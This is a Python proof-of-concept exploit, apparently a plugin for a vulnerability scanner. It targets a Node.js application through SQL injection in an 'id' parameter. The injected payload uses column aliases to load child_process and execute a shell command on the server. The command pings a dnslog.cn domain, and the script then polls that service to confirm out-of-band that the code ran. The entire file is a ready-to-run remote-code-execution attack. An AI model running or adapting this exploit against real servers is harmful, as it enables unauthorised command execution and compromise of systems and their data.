import base64
import random
import time

from urllib.parse import quote

import requests

session=requests.Session()

def getdomain():
    try:
        ret=session.get("http://www.dnslog.cn/getdomain.php?t="+str(random.randint(100000,999999)),
                        timeout=10).text
    except Exception as e:
        print("get dnsdomain error"+str(e))
        ret="error"
        pass
    return ret

def getrecord():
    try:
        ret = session.get("http://www.dnslog.cn/getrecords.php?t="+str(random.randint(100000,999999)),
                          timeout=10).text
    except Exception as e:
        print("get dnsrecord error"+str(e))
        ret="error"
        pass
    return ret

def getdnshost():
    reverhost = ""
    try:
        domain= getdomain()
        if domain=="error":
            print("get domain error")
        else:
            reverhost=domain
    except:
        pass
    return reverhost

def check(url,proxies):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    if '://' not in url:
        target = 'https://%s' %url if ':443' in url else 'https://%s' %url
    else:
        target = url

    domain=getdnshost()
    ret = {'success': False, 'response': [], 'requests': [], 'error': [],'info':[]}
    if domain:
        reverhost="http://"+domain
        try:
            comand= 'ping '+domain
            # comand= 'touch /tmp/aaaa'
            payload = f''';SELECT 1 AS "\\']=0;require=process.mainModule.constructor._load;/*", 2 AS "*/p=require(`child_process`);/*", 3 AS "*/p.exec(`{comand}`)//"'''
            # url_payload=quote(payload,'utf-8')

            if '?id=' in url:
                pass
            else:
                url=url+"?id="+str(random.randint(1,3))
            s = requests.get(url + payload, timeout=10, proxies=proxies)
            print(s.url)
            for i in range(1,6):
                time.sleep(2)
                temp = getrecord()
                if domain in temp:
                    ret['success']=True
                    break
        except Exception as e:
            ret['error']=e
            pass
    else:
        print("get dns error")
    return ret

def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    result = check(url, proxies)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 5,
        ###可选参数###
        'url': "http://127.0.0.1:3000/",
    }
    print(main(params))